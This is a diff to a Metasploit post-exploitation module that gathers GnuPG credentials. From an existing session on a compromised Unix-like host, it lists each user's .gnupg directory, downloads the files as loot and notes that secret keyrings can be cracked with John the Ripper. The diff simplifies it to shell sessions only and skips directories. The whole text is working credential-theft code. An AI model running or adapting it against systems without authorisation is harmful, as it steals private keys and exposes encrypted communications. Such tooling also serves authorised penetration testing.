@@ -24,14 +24,13 @@ class Metasploit3 < Msf::Post
 		super( update_info(info,
 			'Name'           => 'Multi Gather GnuPG Credentials Collection',
 			'Description'    => %q{
-					This module will collect the contents of user's .gpg directory on the targeted
-				machine. Password protected private key files can be cracked with JtR.
+					This module will collect the contents of user's .gnupg directory on the targeted
+				machine. Password protected secret keyrings can be cracked with JtR.
 			},
 			'License'        => MSF_LICENSE,
-			'Author'         => ['Dhiru Kholia <dhiru at openwall.com>'],
-			'Version'        => "$Revision$",
+			'Author'         => ['Dhiru Kholia <dhiru[at]openwall.com>'],
 			'Platform'       => ['linux', 'bsd', 'unix', 'osx'],
-			'SessionTypes'   => ['meterpreter', 'shell' ]
+			'SessionTypes'   => ['shell']
 		))
 	end
 
@@ -55,21 +54,21 @@ class Metasploit3 < Msf::Post
 		print_status("Looting #{paths.count} directories")
 		paths.each do |path|
 			path.chomp!
-			if session.type == "meterpreter"
-				sep = session.fs.file.separator
-				files = session.fs.dir.entries(path)
-			else
-				# Guess, but it's probably right
-				sep = "/"
-				files = cmd_exec("ls -1 #{path}").split(/\r\n|\r|\n/)
-			end
+			sep = "/"
+			files = cmd_exec("ls -1 #{path}").split(/\r\n|\r|\n/)
 
 			files.each do |file|
-				print_good("Downloading #{path}#{sep}#{file} -> #{file}")
-				data = read_file("#{path}#{sep}#{file}")
+				target = "#{path}#{sep}#{file}"
+				if directory?(target)
+					next
+				end
+				print_status("Downloading #{path}#{sep}#{file} -> #{file}")
+				data = read_file(target)
 				file = file.split(sep).last
-				loot_path = store_loot("gpg.#{file}", "text/plain", session, data,
+				type = file.gsub(/\.gpg.*/, "").gsub(/gpg\./, "")
+				loot_path = store_loot("gpg.#{type}", "text/plain", session, data,
 					"gpg_#{file}", "GnuPG #{file} File")
+				print_good("File stored in: #{loot_path.to_s}")
 			end
 
 		end
